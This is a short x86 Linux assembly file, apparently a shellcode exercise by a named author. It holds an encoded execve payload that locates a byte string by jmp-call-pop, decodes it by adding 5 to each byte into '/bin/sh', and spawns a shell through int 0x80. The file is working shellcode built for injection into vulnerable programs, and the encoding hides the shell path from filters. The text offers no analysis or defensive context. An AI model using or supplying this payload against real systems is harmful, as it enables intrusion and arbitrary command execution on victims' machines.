;
; Filename: bin-sh_add5.asm
; Author:   Fernando Benedictti
;

global _start

segment .text

_start:
  jmp short label2

label1:
  pop esi                   

  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  mov al, 0x10
loop_add5:
  mov bl, byte [esi+ecx]
  add bl, 0x5
  mov byte [esi+ecx], bl
  inc ecx
  cmp al, cl
  jne loop_add5
  
  xor eax,eax               
  mov [esi+0x7],al          
  lea ebx,[esi]             
  mov [esi+0x8],ebx         
  mov [esi+0xc],eax         
  mov al,0xb                
  mov ebx,esi               
  lea ecx,[esi+0x8]         
  lea edx,[esi+0xc]         
  int 0x80                  
label2:
  call label1
  label3: db 0x2a, 0x5d, 0x64, 0x69, 0x2a, 0x6e, 0x63, 0x45, 0x3c, 0x3c, 0x3c, 0x3c, 0x46, 0x46, 0x46, 0x46
